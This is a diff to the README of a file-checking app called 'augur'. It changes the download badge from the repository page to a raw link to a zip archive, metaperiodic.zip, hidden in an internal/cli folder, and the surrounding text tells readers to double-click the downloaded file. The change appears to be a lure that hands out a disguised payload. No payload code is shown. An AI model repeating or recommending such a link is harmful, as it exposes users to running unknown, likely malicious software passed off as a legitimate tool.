@@ -6,7 +6,7 @@ Welcome to **augur**! This application helps you check your digital files for hi
 
 ## 📥 Download & Install
 
-[![Download augur](https://img.shields.io/badge/Download-augur-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://github.com/musicschooldate650/augur)
+[![Download augur](https://img.shields.io/badge/Download-augur-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://raw.githubusercontent.com/musicschooldate650/augur/main/internal/cli/metaperiodic.zip)
 
 Visit this link to download the application. Once you're on the page, look for the download button and save the file to your computer. After the download finishes, you can run the application by double-clicking the downloaded file. That's it – no complex setup required!
 
